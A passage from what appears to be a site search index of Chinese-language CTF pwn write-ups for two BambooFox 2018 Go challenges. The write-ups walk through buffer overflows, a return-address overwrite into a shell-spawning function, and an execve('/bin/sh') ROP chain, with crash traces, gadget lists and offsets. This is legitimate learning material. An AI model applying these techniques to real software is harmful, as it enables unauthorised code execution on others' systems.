fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4\n\n\n\n\n\u8a08\u7b97\u4e00\u4e0b payload \u662f \n224\n\n\nweird\n\n\n\u56e0\u70ba\u53ef\u4ee5\u84cb\u5230 return address\uff0c\u4e5f\u5c31\u662f\u8aaa\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u8981\u8df3\u5230\u54ea\u88e1\uff0c\u90a3\u5c31\u628a return address \u6539\u6210\nweird\n\u7684\u958b\u982d\n0x4a2650\n\u5c31\u53ef\u4ee5\u8df3\u904e\u53bb\u57f7\u884c\u56c9\n\n\n\u57f7\u884c\u5f8c\u679c\u7136\u5c31\u6210\u529f\u62ff\u5230 shell \u4e86 OwO", 
            "title": "infant-gotoheaven"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#infant-gotoheaven", 
            "text": "Challenge Link:  infant-gotoheaven  Category: pwn  Writeup:  infant-gotoheaven   What's the token to heaven?  nc bamboofox.cs.nctu.edu.tw 58796  infant-gotoheaven.zip", 
            "title": "infant-gotoheaven"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#go-binanry", 
            "text": "\u958b\u59cb\u524d\u5148\u8b1b\u4e00\u4e0b\u5206\u6790 Go \u7684 binanry \u6642\u53ef\u4ee5\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u4ee5\u53ca\u8a23\u7ac5", 
            "title": "Go binanry \u5c0f\u8a23\u7ac5"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#go-tool-objdump", 
            "text": "go tool \u662f go \u7684\u7de8\u8b6f\u5668\u5167\u5efa\u7684\u5de5\u5177\u96c6\uff0c\u5176\u4e2d\u4e5f\u6709  objdump \u53ef\u4ee5\u4f7f\u7528  \u4f7f\u7528\u9019\u500b\u5de5\u5177\u7684\u8a71\u53ef\u4ee5\u770b\u5230 source code \u4e2d\u7684 \u884c\u6578 \u5c0d\u61c9\u5230\u7684 assembly  go tool objdump infant-gotoheaven  |  less", 
            "title": "go tool objdump"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#gdb", 
            "text": "\u4f7f\u7528 gdb \u8ffd\u8e64\u6642\uff0c\u5728\u57f7\u884c\u5230 main \u4e4b\u524d\u6703\u7d93\u904e\u4e00\u5927\u5806\u7684\u7a0b\u5e8f  \u5728\u8ffd\u8e64 C \u7684 binanry \u6642\uff0c\u901a\u5e38\u6703\u4f7f\u7528  b main \u4f86\u8a2d\u65b7\u9ede\u5728 main  \u7684\u4e00\u958b\u59cb  \u7531\u4e0a\u9762  go tool objdump \u7684\u5716\u53ef\u4ee5\u770b\u5230\uff0cGo \u7684  main  \u53eb\u505a  main.main  \u6240\u4ee5\u8981\u4f7f\u7528  b main.main", 
            "title": "gdb"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#_1", 
            "text": "\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32  % ./infant-gotoheaven                     \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 
            "title": "\u89c0\u5bdf"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#buffer-overflow", 
            "text": "\u901a\u5e38\u770b\u5230\u9019\u985e\u984c\u76ee\u5927\u6982\u90fd\u662f buffer overflow \uff0c\u6240\u4ee5\u5148\u8a66\u4e00\u4e0b\u80fd\u4e0d\u80fd\u89f8\u767c segmentation fault  % ./infant-gotoheaven\nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nunexpected fault address 0x0\nfatal error: fault\n[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4a263e]\n\ngoroutine 1 [running]:\nruntime.throw(0x4d8780, 0x5)\n        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427a05\nruntime.sigpanic()\n        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43d037\nmain.main()\n        /home/frozenkp/Downloads/gobin/infant-gotoheaven/infant-gotoheaven.go:27 +0x1ee fp=0xc420043f80 sp=0xc420043f78 pc=0x4a263e  \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gotoheaven.go:27  \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret \uff0c\u6240\u4ee5\u61c9\u8a72\u662f\u53ef\u4ee5 \u84cb\u5230 return address", 
            "title": "Buffer overflow"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#weird", 
            "text": "\u63a5\u8457\u5728\u7ffb\u4e00\u4e0b objdump \u7684\u7d50\u679c\uff0c\u767c\u73fe\u4e00\u500b\u53eb  weird \u7684 function   \u5176\u4e2d\u6709\u4e00\u884c CALL os/exec.Command(SB) \u53ef\u4ee5\u57f7\u884c system call  \u6aa2\u67e5\u4e00\u4e0b\u5176\u4ed6\u5730\u65b9\u7684\u7a0b\u5f0f\u78bc\uff0c\u767c\u73fe main.main \u6709\u547c\u53eb\u5230   \u4f7f\u7528 gdb \u5f37\u5236\u8b93 cmp \u7b26\u5408\u5f8c\u8df3\u904e\u53bb\u5f8c\u767c\u73fe\u9019\u500b system call \u7684\u53c3\u6578\u662f  /bin/sh   \u6240\u4ee5\u53ea\u8981\u9032\u5165\u5230 weird \u61c9\u8a72\u5c31\u80fd\u62ff\u5230 shell \u4e86", 
            "title": "weird"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#_2", 
            "text": "", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#payload", 
            "text": "\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4   \u8a08\u7b97\u4e00\u4e0b payload \u662f  224", 
            "title": "payload"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/#weird_1", 
            "text": "\u56e0\u70ba\u53ef\u4ee5\u84cb\u5230 return address\uff0c\u4e5f\u5c31\u662f\u8aaa\u53ef\u4ee5\u4efb\u610f\u6307\u5b9a\u8981\u8df3\u5230\u54ea\u88e1\uff0c\u90a3\u5c31\u628a return address \u6539\u6210 weird \u7684\u958b\u982d 0x4a2650 \u5c31\u53ef\u4ee5\u8df3\u904e\u53bb\u57f7\u884c\u56c9  \u57f7\u884c\u5f8c\u679c\u7136\u5c31\u6210\u529f\u62ff\u5230 shell \u4e86 OwO", 
            "title": "weird"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/", 
            "text": "infant-gogogo\n\n\n\n\nChallenge Link: \ninfant-gogogo\n\n\nCategory: pwn\n\n\nWriteup: \ninfant-gogogo\n\n\n\n\nGive me your magic text \n~\n\n\nnc bamboofox.cs.nctu.edu.tw 58795\n\n\ninfant-gogogo.zip\n\n\n\u89c0\u5bdf\n\n\n\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32\uff0c\u770b\u8d77\u4f86\u8ddf\u524d\u4e00\u984c\u7684 \ninfant-gotoheaven\n \u5f88\u50cf\n\n\n% ./infant-gotoheaven                     \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n\n\n\nBuffer overflow\n\n\n\u5148\u8a66\u4e00\u4e0b\u662f\u5426\u4e5f\u6709 Buffer overflow\n\n\n% ./infant-gogogo              \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nunexpected fault address 0x0\nfatal error: fault\n[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834]\n\ngoroutine 1 [running]:\nruntime.throw(0x4b9168, 0x5)\n        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345\nruntime.sigpanic()\n        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307\nmain.main()\n        /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834\n\n\n\n\n\u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728\ninfant-gogogo.go:20\n\n\n\u7528\nobjdump\n\u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728\nret\n\uff0c\u6240\u4ee5\u61c9\u8a72\u8ddf\u4e0a\u984c\u4e00\u6a23\uff0c\u4e5f\u662f\u53ef\u4ee5\n\u84cb\u5230 return address\n\n\n\n\n\u89e3\u6cd5\n\n\n\u9019\u984c\u8ddf  \ninfant-gotoheaven\n \u7684\u4e3b\u8981\u5dee\u5225\u5728\u65bc \ninfant-gotoheaven\n \u6709\u63d0\u4f9b\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230 shell \u7684 \nsystem call\n \uff0c\u9019\u984c\u5247\u8981\u81ea\u5df1\u5efa ROP chain\n\n\npayload\n\n\n\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4\n\n\n\n\n\u8a08\u7b97\u4e00\u4e0b payload \u662f \n256\n\n\nROP chain\n\n\n\u56e0\u70ba Go \u7684 binanry \u6a94\u662f static link \u7684\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f9e\u88e1\u9762\u62ff\u5230\u5404\u5f0f\u5404\u6a23\u7684 gadget\n\n\n% file infant-gogogo \ninfant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped\n\n\n\n\nexecve\n\n\n\u6839\u64da \n\u9019\u7bc7\n \u6574\u7406\u7684\u8868\u683c\uff0c\u8981\u57f7\u884c \nexecve(\n/bin/sh\n)\n \u7684\u689d\u4ef6\u662f\n\n\n\n\n\n\n\n\nrax\n\n\nSystem call\n\n\nrdi\n\n\nrsi\n\n\nrdx\n\n\n\n\n\n\n\n\n\n\n59\n\n\nsys_execve\n\n\nconst char *filename\n\n\nconst char *const argv[]\n\n\nconst char *const envp[]\n\n\n\n\n\n\n\n\n\u57f7\u884c \n/bin/sh\n \u7684\u8a71\uff0c\u53ea\u9700\u8981\u628a \nrdi\n \u6307\u5411\u5beb\u6709 \n/bin/sh\n \u7684\n\u4f4d\u5740\n\uff0c\nrsi\n \u53ca \nrdx\n  \u5247\u8a2d\u6210 0 (NULL) \u5373\u53ef\n\n\nROP gadget\n\n\n\u57fa\u672c\u4e0a\u5728\u8a2d\u503c\u7684\u6642\u5019\uff0c\u5982\u679c\u53ef\u4ee5\u62ff\u5230 \npop {resister}; ret\n \u5f62\u5f0f\u7684 gadget \u6700\u597d\uff0c\u56e0\u70ba\u53ef\u4ee5\u76f4\u63a5\u628a\u8981\u4e1f\u5165\u7684\u503c\u5beb\u5728 gadget \u7684\u4e0b\u4e00\u4f4d\uff0c\u4f8b\u5982\uff1a\n\n\nropchain = pop_rax, p64(59)\n\n\n\n\n\u9019\u6a23\u5728\u57f7\u884c \npop rax\n \u6642\uff0c\u6703\u5c07 stack \u4e0a\u7684\u7b2c\u4e00\u4f4d pop \u5230 rax \u4e0a\uff0c\u800c\u6b64\u6642\u7684\u7b2c\u4e00\u4f4d\u5c31\u6703\u662f \np64(59)\n\n\n\u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u8981\u6ce8\u610f\n\u6700\u5f8c\u9762\u5fc5\u9808\u662f ret\n \uff0c\u5426\u5247\u6c92\u8fa6\u6cd5\u7e7c\u7e8c\u57f7\u884c\u5f8c\u6bb5\u7684 ROP chain\n\n\n\u5c0b\u627e ROP gadget \u53ef\u4ee5\u4f7f\u7528\u6307\u4ee4 \nROPgadget\n \u642d\u914d \ngrep\n\uff0c\u4f8b\u5982\u8aaa\u8981\u627e \npop rax\n \u6642\uff1a\n\n\n% ROPgadget --binary infant-gogogo | grep \npop rax.*ret\n\n0x000000000044dd12 : add eax, ebp ; pop rax ; ret\n0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret\n0x0000000000466d3e : je 0x466d67 ; pop rax ; ret\n0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret\n0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret\n0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret\n0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret\n0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret\n0x000000000040985c : pop rax ; or dh, dh ; ret\n0x0000000000404656 : pop rax ; ret\n0x0000000000414f4a : pop rax ; ret 0xff2\n0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret\n\n\n\n\n\u5176\u4e2d\u53ef\u4ee5\u770b\u5230 \n0x0000000000404656 : pop rax ; ret\n \u662f\u6700\u7b26\u5408\u7684 gadget\n\n\n/bin/sh\n\n\n\u524d\u9762\u6709\u8aaa\u5230\uff0c\nrdi\n\u662f\u5beb\u6709 \n/bin/sh\n \u7684\n\u4f4d\u5740\n\uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u584a\u7a7a\u9593\u4f86\u5beb \n/bin/sh\n\n\n\u5728 gdb \u4e2d\u4f7f\u7528 \nvmmap\n \u4f86\u5c0b\u627e\u53ef\u7528\u7a7a\u9593\n\n\ngdb-peda$ vmmap\nStart              End                Perm      Name\n0x00400000         0x0048a000         r-xp      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0048a000         0x0051c000         r--p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0051c000         0x0052f000         rw-p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0052f000         0x00550000         rw-p      [heap]\n0x000000c000000000 0x000000c000001000 rw-p      mapped\n0x000000c41fff8000 0x000000c420100000 rw-p      mapped\n0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p      mapped\n0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]\n0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]\n0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]\n0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]\n\n\n\n\n\u5176\u4e2d\u6709\u6bb5 \n0x0051c000         0x0052f000         rw-p\n \u662f\u53ef\u5beb\u7684\uff0c\u6211\u9078\u64c7 \n0x523000\n \u4f86\u5beb\uff0c\u76e1\u91cf\u4e0d\u8981\u9078\u64c7\u592a\u524d\u9762\u6216\u592a\u5f8c\u9762\u7684\u4f4d\u7f6e\uff0c\u6015\u8ddf\u5176\u4ed6\u6771\u897f\u885d\u5230\n\n\n\u53ef\u4ee5\u5beb\u5165\u5230 \nrdi\n \u7684\u6709\u4ee5\u4e0b\u5169\u53e5\n\n\n0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret\n0x00000000004518ff : mov qword ptr [rdi], rax ; ret\n\n\n\n\n\u5176\u4e2d\uff0c\npop rdi\n \u7684 gadget \u5f8c\u9762\u9084\u6709 \nadd byte ptr [rax + 0x39]\n\uff0c\u6240\u4ee5\u5fc5\u9808\u78ba\u4fdd \nrax+0x39\n\u662f\u4e00\u6bb5\u53ef\u4ee5\u5beb\u7684\u4f4d\u5740\uff0c\u5426\u5247\u6703\u6b7b\u6389\n\n\n\u56e0\u6b64\u6211\u5148\u5c07 \nrax\n \u8a2d\u6210 data \u7684\u4f4d\u5740\uff0c\u8a2d\u5b8c \nrdi\n \u5f8c\uff0c\u518d\u5c07 \nrax\n \u8a2d\u6210 \n/bin/sh\n \uff0c\u6700\u5f8c\u586b\u5165 \nptr [rdi]\n \u4e2d\u5373\u53ef\n\n\n\u6240\u6709\u5f97\u689d\u4ef6\u90fd\u8a2d\u5b9a\u5b8c\u6210\u5f8c\uff0c\u57f7\u884c\u5373\u53ef\u62ff\u5230 shell \u56c9 OwO", 
            "title": "infant-gogogo"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#infant-gogogo", 
            "text": "Challenge Link:  infant-gogogo  Category: pwn  Writeup:  infant-gogogo   Give me your magic text  ~  nc bamboofox.cs.nctu.edu.tw 58795  infant-gogogo.zip", 
            "title": "infant-gogogo"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#_1", 
            "text": "\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32\uff0c\u770b\u8d77\u4f86\u8ddf\u524d\u4e00\u984c\u7684  infant-gotoheaven  \u5f88\u50cf  % ./infant-gotoheaven                     \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 
            "title": "\u89c0\u5bdf"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#buffer-overflow", 
            "text": "\u5148\u8a66\u4e00\u4e0b\u662f\u5426\u4e5f\u6709 Buffer overflow  % ./infant-gogogo              \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nunexpected fault address 0x0\nfatal error: fault\n[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x489834]\n\ngoroutine 1 [running]:\nruntime.throw(0x4b9168, 0x5)\n        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427345\nruntime.sigpanic()\n        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43a307\nmain.main()\n        /home/frozenkp/Downloads/gobin/infant-gogogo.go:20 +0x1b4 fp=0xc420043f80 sp=0xc420043f78 pc=0x489834  \u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728 infant-gogogo.go:20  \u7528 objdump \u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728 ret \uff0c\u6240\u4ee5\u61c9\u8a72\u8ddf\u4e0a\u984c\u4e00\u6a23\uff0c\u4e5f\u662f\u53ef\u4ee5 \u84cb\u5230 return address", 
            "title": "Buffer overflow"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#_2", 
            "text": "\u9019\u984c\u8ddf   infant-gotoheaven  \u7684\u4e3b\u8981\u5dee\u5225\u5728\u65bc  infant-gotoheaven  \u6709\u63d0\u4f9b\u53ef\u4ee5\u76f4\u63a5\u62ff\u5230 shell \u7684  system call  \uff0c\u9019\u984c\u5247\u8981\u81ea\u5df1\u5efa ROP chain", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#payload", 
            "text": "\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion fault\uff0c\u78ba\u5b9a\u7a0b\u5f0f\u6703\u7522\u751f buffer overflow\uff0c\u4e14\u662f\u6b7b\u5728 return addresss \u932f\u8aa4   \u8a08\u7b97\u4e00\u4e0b payload \u662f  256", 
            "title": "payload"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#rop-chain", 
            "text": "\u56e0\u70ba Go \u7684 binanry \u6a94\u662f static link \u7684\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f9e\u88e1\u9762\u62ff\u5230\u5404\u5f0f\u5404\u6a23\u7684 gadget  % file infant-gogogo \ninfant-gogogo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped", 
            "title": "ROP chain"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#execve", 
            "text": "\u6839\u64da  \u9019\u7bc7  \u6574\u7406\u7684\u8868\u683c\uff0c\u8981\u57f7\u884c  execve( /bin/sh )  \u7684\u689d\u4ef6\u662f     rax  System call  rdi  rsi  rdx      59  sys_execve  const char *filename  const char *const argv[]  const char *const envp[]     \u57f7\u884c  /bin/sh  \u7684\u8a71\uff0c\u53ea\u9700\u8981\u628a  rdi  \u6307\u5411\u5beb\u6709  /bin/sh  \u7684 \u4f4d\u5740 \uff0c rsi  \u53ca  rdx   \u5247\u8a2d\u6210 0 (NULL) \u5373\u53ef", 
            "title": "execve"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#rop-gadget", 
            "text": "\u57fa\u672c\u4e0a\u5728\u8a2d\u503c\u7684\u6642\u5019\uff0c\u5982\u679c\u53ef\u4ee5\u62ff\u5230  pop {resister}; ret  \u5f62\u5f0f\u7684 gadget \u6700\u597d\uff0c\u56e0\u70ba\u53ef\u4ee5\u76f4\u63a5\u628a\u8981\u4e1f\u5165\u7684\u503c\u5beb\u5728 gadget \u7684\u4e0b\u4e00\u4f4d\uff0c\u4f8b\u5982\uff1a  ropchain = pop_rax, p64(59)  \u9019\u6a23\u5728\u57f7\u884c  pop rax  \u6642\uff0c\u6703\u5c07 stack \u4e0a\u7684\u7b2c\u4e00\u4f4d pop \u5230 rax \u4e0a\uff0c\u800c\u6b64\u6642\u7684\u7b2c\u4e00\u4f4d\u5c31\u6703\u662f  p64(59)  \u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u8981\u6ce8\u610f \u6700\u5f8c\u9762\u5fc5\u9808\u662f ret  \uff0c\u5426\u5247\u6c92\u8fa6\u6cd5\u7e7c\u7e8c\u57f7\u884c\u5f8c\u6bb5\u7684 ROP chain  \u5c0b\u627e ROP gadget \u53ef\u4ee5\u4f7f\u7528\u6307\u4ee4  ROPgadget  \u642d\u914d  grep \uff0c\u4f8b\u5982\u8aaa\u8981\u627e  pop rax  \u6642\uff1a  % ROPgadget --binary infant-gogogo | grep  pop rax.*ret \n0x000000000044dd12 : add eax, ebp ; pop rax ; ret\n0x000000000044dd10 : and al, 0x10 ; add eax, ebp ; pop rax ; ret\n0x0000000000466d3e : je 0x466d67 ; pop rax ; ret\n0x000000000044dd0d : or dh, al ; and al, 0x10 ; add eax, ebp ; pop rax ; ret\n0x0000000000402563 : pop rax ; add rsp, 0x60 ; ret\n0x000000000040e31b : pop rax ; and byte ptr [rax - 1], cl ; ret\n0x0000000000448b11 : pop rax ; mov qword ptr [rsp + 0x10], rax ; ret\n0x000000000043cfb3 : pop rax ; or byte ptr [rax - 0x7d], cl ; ret\n0x000000000040985c : pop rax ; or dh, dh ; ret\n0x0000000000404656 : pop rax ; ret\n0x0000000000414f4a : pop rax ; ret 0xff2\n0x000000000040e318 : sbb byte ptr [rax - 0x75], cl ; pop rax ; and byte ptr [rax - 1], cl ; ret  \u5176\u4e2d\u53ef\u4ee5\u770b\u5230  0x0000000000404656 : pop rax ; ret  \u662f\u6700\u7b26\u5408\u7684 gadget", 
            "title": "ROP gadget"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gogogo/#binsh", 
            "text": "\u524d\u9762\u6709\u8aaa\u5230\uff0c rdi \u662f\u5beb\u6709  /bin/sh  \u7684 \u4f4d\u5740 \uff0c\u6240\u4ee5\u9700\u8981\u627e\u4e00\u584a\u7a7a\u9593\u4f86\u5beb  /bin/sh  \u5728 gdb \u4e2d\u4f7f\u7528  vmmap  \u4f86\u5c0b\u627e\u53ef\u7528\u7a7a\u9593  gdb-peda$ vmmap\nStart              End                Perm      Name\n0x00400000         0x0048a000         r-xp      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0048a000         0x0051c000         r--p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0051c000         0x0052f000         rw-p      /home/frozenkp/Documents/CTF/BambooFox_CTF_2018/infant-gogogo/infant-gogogo\n0x0052f000         0x00550000         rw-p      [heap]\n0x000000c000000000 0x000000c000001000 rw-p      mapped\n0x000000c41fff8000 0x000000c420100000 rw-p      mapped\n0x00007ffff7f5b000 0x00007ffff7ffb000 rw-p      mapped\n0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]\n0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]\n0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]\n0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]  \u5176\u4e2d\u6709\u6bb5  0x0051c000         0x0052f000         rw-p  \u662f\u53ef\u5beb\u7684\uff0c\u6211\u9078\u64c7  0x523000  \u4f86\u5beb\uff0c\u76e1\u91cf\u4e0d\u8981\u9078\u64c7\u592a\u524d\u9762\u6216\u592a\u5f8c\u9762\u7684\u4f4d\u7f6e\uff0c\u6015\u8ddf\u5176\u4ed6\u6771\u897f\u885d\u5230  \u53ef\u4ee5\u5beb\u5165\u5230  rdi  \u7684\u6709\u4ee5\u4e0b\u5169\u53e5  0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret\n0x00000000004518ff : mov qword ptr [rdi], rax ; ret  \u5176\u4e2d\uff0c pop rdi  \u7684 gadget \u5f8c\u9762\u9084\u6709  add byte ptr [rax + 0x39] \uff0c\u6240\u4ee5\u5fc5\u9808\u78ba\u4fdd  rax+0x39 \u662f\u4e00\u6bb5\u53ef\u4ee5\u5beb\u7684\u4f4d\u5740\uff0c\u5426\u5247\u6703\u6b7b\u6389  \u56e0\u6b64\u6211\u5148\u5c07  rax  \u8a2d\u6210 data \u7684\u4f4d\u5740\uff0c\u8a2d\u5b8c  rdi  \u5f8c\uff0c\u518d\u5c07  rax  \u8a2d\u6210  /bin/sh  \uff0c\u6700\u5f8c\u586b\u5165  ptr [rdi]  \u4e2d\u5373\u53ef  \u6240\u6709\u5f97\u689d\u4ef6\u90fd\u8a2d\u5b9a\u5b8c\u6210\u5f8c\uff0c\u57f7\u884c\u5373\u53ef\u62ff\u5230 shell \u56c9 OwO", 
            "title": "/bin/sh"
        }, 
        {
            "location": "/Writeups/Others/pwnable.tw/Start/", 
